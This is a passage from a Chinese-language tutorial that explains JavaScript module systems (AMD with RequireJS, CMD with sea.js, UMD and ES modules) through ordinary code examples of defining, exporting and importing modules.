<li>异步加载导致更好的启动时间；</li>
<li>能够将模块拆分为多个文件；</li>
<li>支持构造函数；</li>
<li>无需额外工具即可在浏览器中工作。</li>
</ul>
<p>AMD 的<strong>缺点</strong>：</p>
<ul>
<li>语法很复杂，学习成本高；</li>
<li>需要一个像 RequireJS 这样的加载器库来使用 AMD。</li>
</ul>
<h3 id="（2）使用-1"><a href="#（2）使用-1" class="headerlink" title="（2）使用"></a>（2）使用</h3><p>当然，上面只是 AMD 规范的理论，要想理解这个理论在代码中是如何工作的，就需要来看看 AMD 的实际实现。RequireJS 就是 AMD 规范的一种实现，它被描述为“JavaScript 文件和模块加载器”。下面就来看看 RequireJS 是如何使用的。</p>
<h4 id="①-引入-RequireJS"><a href="#①-引入-RequireJS" class="headerlink" title="① 引入 RequireJS"></a>① 引入 RequireJS</h4><p>可以通过 npm 来安装 RequireJS：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm i requirejs</span><br></pre></td></tr></table></figure>

<p>也可以在 html 文件引入 <code>require.js</code> 文件：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">data-main</span>=<span class="string">&quot;js/config&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/require.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里 <code>script</code>标签有两个属性：</p>
<ul>
<li><code>data-main=&quot;js/config&quot;</code>：这是 RequireJS 的入口，也是配置它的地方；</li>
<li><code>src=&quot;js/require.js&quot;</code>：加载脚本的正常方式，会加载 <code>require.js</code> 文件。</li>
</ul>
<p>在 <code>script</code> 标签下添加以下代码来初始化 RequireJS：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="built_in">require</span>([<span class="string">&#x27;config&#x27;</span>], <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//...</span></span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当页面加载完配置文件之后， <code>require()</code> 中的代码就会运行。这个 <code>script</code> 标签是一个异步调用，这意味着当 RequireJS 通过 <code>src=&quot;js/require.js</code> 加载时，它将异步加载 <code>data-main</code> 属性中指定的配置文件。因此，该标签下的任何 JavaScript 代码都可以在 RequireJS 获取时执行配置文件。</p>
<p>那 AMD 中的 <code>require()</code> 和 CommonJS 中的 <code>require()</code> 有什么区别呢？</p>
<ul>
<li>AMD <code>require(</code>) 接受一个依赖数组和一个回调函数，CommonJS <code>require()</code> 接受一个模块 ID；</li>
<li>AMD <code>require()</code> 是异步的，而 CommonJS <code>require()</code> 是同步的。</li>
</ul>
<h4 id="②-定义-AMD-模块"><a href="#②-定义-AMD-模块" class="headerlink" title="② 定义 AMD 模块"></a>② 定义 AMD 模块</h4><p>下面是 AMD 中的一个基本模块定义：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">define</span>([<span class="string">&#x27;dependency1&#x27;</span>, <span class="string">&#x27;dependency2&#x27;</span>], <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 模块内容</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>这个模块定义清楚地显示了其包含两个依赖项和一个函数。</p>
<p>下面来定义一个名为<code>addition.js</code>的文件，其包含一个执行加法操作的函数，但是没有依赖项：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// addition.js</span></span><br><span class="line"><span class="title function_">define</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(a + b)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>再来定义一个名为 <code>calculator.js</code> 的文件：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">define</span>([<span class="string">&#x27;addition&#x27;</span>], <span class="keyword">function</span> (<span class="params">addition</span>) &#123;</span><br><span class="line">  <span class="title function_">addition</span>(<span class="number">7</span>, <span class="number">9</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>当 RequireJS 看到上面的代码块时，它会去寻找依赖项，并通过将它们作为参数传递给函数来自动将其注入到模块中。</p>
<p>RequireJS 会自动为 <code>addition.js</code> 和 <code>calculator.js</code> 文件创建一个 <code>&lt;script&gt;</code> 标签，并将其放在 HTML <code>&lt;head&gt;</code> 元素中，等待它们加载，然后运行函数，这类似于 <code>require()</code> 的行为。</p>
<p><img src="https://cdn.huatree.top/image-20221218132540177.png" alt="image-20221218132540177"></p>
<p>下面来更新一下 <code>index.html</code> 文件：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.html</span></span><br><span class="line"><span class="built_in">require</span>([<span class="string">&#x27;config&#x27;</span>], <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="built_in">require</span>([<span class="string">&#x27;calculator&#x27;</span>])</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>当浏览器加载 <code>index.html</code> 文件时，RequireJS 会尝试查找 <code>calculator.js</code> 模块，但是没有找到，所以浏览器也不会有任何反应。那该如何解决这个问题呢？我们必须提供配置文件来告诉 RequireJS 在哪里可以找到 <code>calculator.js</code>（和其他模块），因为它是引用的入口。</p>
<p>下面是配置文件的基本结构：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">requirejs.<span class="title function_">config</span>(&#123;</span><br><span class="line">  <span class="attr">baseURL</span>: <span class="string">&#x27;string&#x27;</span>,</span><br><span class="line">  <span class="attr">paths</span>: &#123;&#125;,</span><br><span class="line">  <span class="attr">shim</span>: &#123;&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>这里有三个属性值：</p>
<ul>
<li><code>baseURL</code>：告诉 RequireJS 在哪里可以找到模块；</li>
<li><code>path</code>：这些是与 define() 一起使用的模块的名称。在路径中，可以使用文件的 CDN，这时 RequireJS 将尝试在本地可用的模块之前加载模块的 CDN 版本；</li>
<li><code>shim</code>：允许加载未编写为 AMD 模块的库，并允许以正确的顺序加载它们</li>
</ul>
<p>我们的配置文件如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">requirejs.<span class="title function_">config</span>(&#123;</span><br><span class="line">  <span class="attr">baseURL</span>: <span class="string">&#x27;js&#x27;</span>,</span><br><span class="line">  <span class="attr">paths</span>: &#123;</span><br><span class="line">    <span class="comment">// 这种情况下，模块位于 customScripts 文件中</span></span><br><span class="line">    <span class="attr">addition</span>: <span class="string">&#x27;customScripts/addition&#x27;</span>,</span><br><span class="line">    <span class="attr">calculator</span>: <span class="string">&#x27;customScripts/calculator&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>配置完成之后，重新加载浏览器，就会收到浏览器的弹窗：</p>
<p><img src="https://cdn.huatree.top/image-20221218132554323.png" alt="image-20221218132554323"></p>
<p>这就是在 AMD 中使用 RequireJS 定义模块的方法之一。我们还可以通过指定其路径名来定义模块，该路径名是模块文件在项目目录中的位置。下面给出一个例子：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">define</span>(<span class="string">&#x27;path/to/module&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 模块内容</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>当然，RequireJS 并不鼓励这种方法，因为当我们将模块移动到项目中的另一个位置时，就需要手动更改模块中的路径名。</p>
<p>在使用 AMD 定义模块时需要注意：</p>
<ul>
<li>在依赖项数组中列出的任何内容都必须与工厂函数中的分配相匹配；</li>
<li>尽量不要将异步代码与同步代码混用。当在 index.html 上编写其他 JavaScript 代码时就是这种情况。</li>
</ul>
<h2 id="5-CMD"><a href="#5-CMD" class="headerlink" title="5. CMD"></a><strong>5. CMD</strong></h2><p>CMD 全称为 Common Module Definition，即通用模块定义。CMD 规范整合了 CommonJS 和 AMD 规范的特点。sea.js 是 CMD 规范的一个实现 。</p>
<p>CMD 定义模块也是通过一个全局函数 <code>define</code> 来实现的，但只有一个参数，该参数既可以是函数也可以是对象：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">define</span>(factory)</span><br></pre></td></tr></table></figure>

<p>如果这个参数是对象，那么模块导出的就是对象；如果这个参数为函数，那么这个函数会被传入 3 个参数：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">define</span>(<span class="keyword">function</span> (<span class="params"><span class="built_in">require</span>, <span class="built_in">exports</span>, <span class="variable language_">module</span></span>) &#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>这三个参数分别如下：（1）<code>require</code>：一个函数，通过调用它可以引用其他模块，也可以调用 <code>require.async</code> 函数来异步调用模块；（2）<code>exports</code>：一个对象，当定义模块的时候，需要通过向参数 <code>exports</code> 添加属性来导出模块 API；（3）<code>module</code> 是一个对象，它包含 3 个属性：</p>
<ul>
<li><code>uri</code>：模块完整的 URI 路径；</li>
<li><code>dependencies</code>：模块依赖；</li>
<li><code>exports</code>：模块需要被导出的 API，作用同第二个参数 <code>exports</code>。</li>
</ul>
<p>下面来看一个例子，定义一个 <code>increment</code> 模块，引用 <code>math</code> 模块的 <code>add</code> 函数，经过封装后导出成 <code>increment</code> 函数：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">define</span>(<span class="keyword">function</span> (<span class="params"><span class="built_in">require</span>, <span class="built_in">exports</span>, <span class="variable language_">module</span></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> add = <span class="built_in">require</span>(<span class="string">&#x27;math&#x27;</span>).<span class="property">add</span></span><br><span class="line">  <span class="built_in">exports</span>.<span class="property">increment</span> = <span class="keyword">function</span> (<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">add</span>(val, <span class="number">1</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable language_">module</span>.<span class="property">id</span> = <span class="string">&#x27;increment&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>CMD 最大的特点就是懒加载，不需要在定义模块的时候声明依赖，可以在模块执行时动态加载依赖。除此之外，CMD 同时支持<strong>同步加载模块</strong>和<strong>异步加载模块</strong>。</p>
<p><strong>AMD 和 CMD 的两个主要区别如下：</strong></p>
<ul>
<li>AMD 需要异步加载模块，而 CMD 在加载模块时，可以同步加载（<code>require</code>），也可以异步加载（<code>require.async</code>）。</li>
<li>CMD 遵循依赖就近原则，AMD 遵循依赖前置原则。也就是说，在 AMD 中，需要把模块所需要的依赖都提前在依赖数组中声明。而在 CMD 中，只需要在具体代码逻辑内，使用依赖前，把依赖的模块 <code>require</code> 进来。</li>
</ul>
<h2 id="6-UMD"><a href="#6-UMD" class="headerlink" title="6. UMD"></a><strong>6. UMD</strong></h2><p>UMD 全程为 Universal Module Definition，即<strong>统一模块定义</strong>。其实 UMD 并不是一个模块管理规范，而是带有前后端同构思想的模块封装工具。</p>
<p>UMD 是一组同时支持 AMD 和 CommonJS 的模式，它旨在使代码无论执行代码的环境如何都能正常工作，通过 UMD 可以在合适的环境选择对应的模块规范。比如在 Node.js 环境中采用 CommonJS 模块管理，在浏览器环境且支持 AMD 的情况下采用 AMD 模块，否则导出为全局函数。</p>
<p>一个 UMD 模块由两部分组成：</p>
<ul>
<li>**立即调用函数表达式 (IIFE)**：它会检查使用模块的环境。其有两个参数：<code>root</code> 和 <code>factory</code>。<code>root</code> 是对全局范围的 this 引用，而 <code>factory</code> 是定义模块的函数。</li>
<li><strong>匿名函数：</strong> 创建模块，此匿名函数被传递任意数量的参数以指定模块的依赖关系。</li>
</ul>
<p>UMD 的代码实现如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">;(<span class="keyword">function</span> (<span class="params">root, factory</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> define === <span class="string">&#x27;function&#x27;</span> &amp;&amp; define.<span class="property">amd</span>) &#123;</span><br><span class="line">    <span class="title function_">define</span>([], factory)</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">exports</span> === <span class="string">&#x27;object&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable language_">module</span>.<span class="property">exports</span>, (<span class="variable language_">module</span>.<span class="property">exports</span> = <span class="title function_">factory</span>())</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    root.<span class="property">returnExports</span> = <span class="title function_">factory</span>()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)(<span class="variable language_">this</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 模块内容定义</span></span><br><span class="line">  <span class="keyword">return</span> &#123;&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>它的执行过程如下：</p>
<ol>
<li>先判断是否支持 Node.js 模块格式（exports 是否存在），存在则使用 Node.js 模块格式；</li>
<li>再判断是否支持 AMD（define 是否存在），存在则使用 AMD 方式加载模块；</li>
<li>若两个都不存在，则将模块公开到全局（Window 或 Global）。</li>
</ol>
<p><strong>UMD 的特点如下：</strong>① UMD 的优点：</p>
<ul>
<li>小而简洁；</li>
<li>适用于服务器端和客户端。</li>
</ul>
<p>② UMD 的缺点：</p>
<ul>
<li>不容易正确配置。</li>
</ul>
<h2 id="7-ES-模块"><a href="#7-ES-模块" class="headerlink" title="7. ES 模块"></a><strong>7. ES 模块</strong></h2><h3 id="（1）概念-3"><a href="#（1）概念-3" class="headerlink" title="（1）概念"></a>（1）概念</h3><p>通过上面的例子，你可能会发现，使用 UMD、AMD、CMD 的代码会变得难以编写和理解。于是在 2015 年，负责 ECMAScript 规范的 TC39 委员会将模块添加为 JavaScript 的内置功能，这些模块称为 ECMAScript 模块，简称 ES 模块。</p>
<p>模块和经典 JavaScript 脚本略有不同：</p>
<ul>
<li>模块默认启用<strong>严格模式，</strong>比如分配给未声明的变量会报错：</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;module&quot;</span>&gt;</span></span><br><span class="line">  a = 5</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>模块有一个词法顶级作用域。这意味着，例如，运行 var foo &#x3D; 42; 在模块内不会创建名为 foo 的全局变量，可通过浏览器中的 window.foo 访问，尽管在经典 JavaScript 脚本中会出现这种情况；</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;module&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> person = <span class="string">&#x27;Alok&#x27;</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;module&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">alert</span>(<span class="params">person</span>)</span></span><br><span class="line"><span class="language-javascript">  &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">/* Error: person is not defined */</span></span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>模块中的 this 并不引用全局 this，而是 undefined。（如果需要访问全局 this，可以使用 globalThis）；</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">alert</span>(<span class="params"><span class="variable language_">this</span></span>)</span></span><br><span class="line"><span class="language-javascript">  &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">/* 全局对象 */</span></span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;module&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">alert</span>(<span class="params"><span class="variable language_">this</span></span>)</span></span><br><span class="line"><span class="language-javascript">  &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">/* undefined */</span></span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>新的静态导入和导出语法仅在模块中可用，并不适用于经典脚本。</li>
<li>顶层 await 在模块中可用，但在经典 JavaScript 脚本中不可用；</li>
<li>await 不能在模块中的任何地方用作变量名，经典脚本中的变量可以在异步函数之外命名为 await；</li>
<li>JavaScript 会提升 import 语句。因此，可以在模块中的任何位置定义它们。</li>
</ul>
<p>CommonJS 和 AMD 都是在运行时确定依赖关系，即运行时加载，CommonJS 加载的是拷贝。而 ES 模块是在编译时就确定依赖关系，所有加载的其实都是引用，这样做的好处是可以执行静态分析和类型检查。</p>
<h3 id="（2）语法"><a href="#（2）语法" class="headerlink" title="（2）语法"></a>（2）语法</h3><h4 id="①-导出"><a href="#①-导出" class="headerlink" title="① 导出"></a>① 导出</h4><p>当导出模块代码时，需要在其前面添加 export 关键词。导出内容可以是变量、函数或类。任何未导出的代码都是模块私有的，无法在该模块之被外访问。ES 模块支持两种类型的导出：</p>
<ul>
<li><strong>命名导出：</strong></li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> first = <span class="string">&#x27;JavaScript&#x27;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">func</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当然，我们也可以先定义需要导出的变量&#x2F;函数，最后统一导出这些变量&#x2F;函数：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> first = <span class="string">&#x27;JavaScript&#x27;</span></span><br><span class="line"><span class="keyword">const</span> second = <span class="string">&#x27;TypeScript&#x27;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">func</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> &#123; first, second, func &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>默认导出：</strong></li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">func</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> func</span><br></pre></td></tr></table></figure>

<p>当然，也可以直接默认导出：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">func</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>默认导出可以省略变量&#x2F;函数&#x2F;类名，在导入时可以为其指定任意名称：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 导出</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;foo&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 导入</span></span><br><span class="line"><span class="keyword">import</span> customName <span class="keyword">from</span> <span class="string">&#x27;./module&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong> 导入默认模块时不需要大括号，导出默认的变量或方法可以有名字，但是对外是无效的。<code>export default</code> 在一个模块文件中只能使用一次。</p>
<p>可以使用 as 关键字来重命名需要暴露出的变量或方法，经过重命名后同一变量可以多次暴露出去：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> first = <span class="string">&#x27;test&#x27;</span></span><br><span class="line"><span class="keyword">export</span> &#123; first <span class="keyword">as</span> second &#125;</span><br></pre></td></tr></table></figure>

<h4 id="②-导入"><a href="#②-导入" class="headerlink" title="② 导入"></a>② 导入</h4><p>使用<strong>命名导出</strong>的模块，可以通过以下方式来导入：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; first, second, func &#125; <span class="keyword">from</span> <span class="string">&#x27;./module&#x27;</span></span><br></pre></td></tr></table></figure>

<p>使用<strong>默认导出</strong>的模块，可以通过以下方式来引入，导入名称可以自定义，无论导出的名称是什么：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> customName <span class="keyword">from</span> <span class="string">&#x27;./module.js&#x27;</span></span><br></pre></td></tr></table></figure>

<p>导入模块位置可以是相对路径也可以是绝对路径，<code>.js</code>扩展名是可以省略的，如果不带路径而只是模块名，则需要通过配置文件告诉引擎查找的位置：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; firstName, lastName &#125; <span class="keyword">from</span> <span class="string">&#x27;./module&#x27;</span></span><br></pre></td></tr></table></figure>

<p>可以使用 as 关键字来将导入的变量&#x2F;函数重命名：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; fn <span class="keyword">as</span> fn1 &#125; <span class="keyword">from</span> <span class="string">&#x27;./profile&#x27;</span></span><br></pre></td></tr></table></figure>

<p>在 ES 模块中，默认导入和命名导入是可以同时使用的，比如在 React 组件中：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span>, &#123; usestate, useEffect &#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">Comp</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">React.Fragment</span>&gt;</span>...<span class="tag">&lt;/<span class="name">React.Fragment</span>&gt;</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Comp</span></span><br></pre></td></tr></table></figure>

<p>可以使用 as 关键字来加载整个模块，用于从另一个模块中导入所有命名导出，会忽略默认导出：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> circle <span class="keyword">from</span> <span class="string">&#x27;./circle&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;圆面积：&#x27;</span> + circle.<span class="title function_">area</span>(<span class="number">4</span>))</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;圆周长：&#x27;</span> + circle.<span class="title function_">circumference</span>(<span class="number">14</span>))</span><br></pre></td></tr></table></figure>

<h4 id="③-动态导入"><a href="#③-动态导入" class="headerlink" title="③ 动态导入"></a>③ 动态导入</h4><p>上面我们介绍的都是静态导入，使用静态 import 时，整个模块需要先下载并执行，然后主代码才能执行。有时我们不想预先加载模块，而是按需加载，仅在需要时才加载。这可以提高初始加载时的性能，动态 import 使这成为可能：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;module&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  ;(<span class="keyword">async</span> () =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> moduleSpecifier = <span class="string">&#x27;./lib.mjs&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> &#123; repeat, shout &#125; = <span class="keyword">await</span> <span class="title function_">import</span>(moduleSpecifier)</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">repeat</span>(<span class="string">&#x27;hello&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// → &#x27;hello hello&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">shout</span>(<span class="string">&#x27;Dynamic import in action&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// → &#x27;DYNAMIC IMPORT IN ACTION!&#x27;</span></span></span><br><span class="line"><span class="language-javascript">  &#125;)()</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>与静态导入不同，动态导入可以在常规脚本中使用。</p>
<h4 id="④-其他用法"><a href="#④-其他用法" class="headerlink" title="④ 其他用法"></a>④ 其他用法</h4><p>可以使用以下方式来先导入后导出模块内容：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> &#123; foo, bar &#125; <span class="keyword">from</span> <span class="string">&#x27;./module&#x27;</span></span><br></pre></td></tr></table></figure>

<p>上面的代码就等同于：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; foo, bar &#125; <span class="keyword">from</span> <span class="string">&#x27;./module&#x27;</span></span><br><span class="line"><span class="keyword">export</span> &#123; foo, boo &#125;</span><br></pre></td></tr></table></figure>

<p>另一个与模块相关的新功能是<code>import.meta</code>，它是一个给 JavaScript 模块暴露特定上下文的元数据属性的对象。它包含了这个模块的信息，比如说这个模块的 URL。</p>
<p>默认情况下，图像是相对于 HTML 文档中的当前 URL 加载的。<code>import.meta.url</code>可以改为加载相对于当前模块的图像：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">loadThumbnail</span>(<span class="params">relativePath</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> url = <span class="keyword">new</span> <span class="title function_">URL</span>(relativePath, <span class="keyword">import</span>.<span class="property">meta</span>.<span class="property">url</span>)</span><br><span class="line">  <span class="keyword">const</span> image = <span class="keyword">new</span> <span class="title class_">Image</span>()</span><br><span class="line">  image.<span class="property">src</span> = url</span><br><span class="line">  <span class="keyword">return</span> image</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> thumbnail = <span class="title function_">loadThumbnail</span>(<span class="string">&#x27;../img/thumbnail.png&#x27;</span>)</span><br><span class="line">container.<span class="title function_">append</span>(thumbnail)</span><br></pre></td></tr></table></figure>

<h3 id="（3）在浏览器使用"><a href="#（3）在浏览器使用" class="headerlink" title="（3）在浏览器使用"></a>（3）在浏览器使用</h3><p>目前主流浏览器都支持 ES 模块：</p>
<p><img src="https://cdn.huatree.top/image-20221218132618187.png" alt="image-20221218132618187"></p>
<p>如果想在浏览器中使用原生 ES 模块方案，只需要在 script 标签上添加 <code>type=&quot;module&quot;</code> 属性。通过该属性，浏览器知道这个文件是以模块化的方式运行的。而对于不支持的浏览器，需要通过 <code>nomodule</code> 属性来指定某脚本为 fallback 方案：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;module&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">import</span> module1 <span class="keyword">from</span> <span class="string">&#x27;./module1&#x27;</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nomodule</span> <span class="attr">src</span>=<span class="string">&quot;fallback.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>支持 <code>type=&quot;module&quot;</code> 的浏览器会忽略带有 <code>nomodule</code> 属性的脚本。使用 <code>type=&quot;module&quot;</code> 的另一个作用就是进行 ES Next 兼容性的嗅探。因为支持 ES 模块化的浏览器，都支持 ES Promise 等特性。</p>
<p>由于默认情况下模块是延迟的，因此可能还希望以延迟方式加载 nomodule 脚本：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nomodule</span> <span class="attr">defer</span> <span class="attr">src</span>=<span class="string">&quot;fallback.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

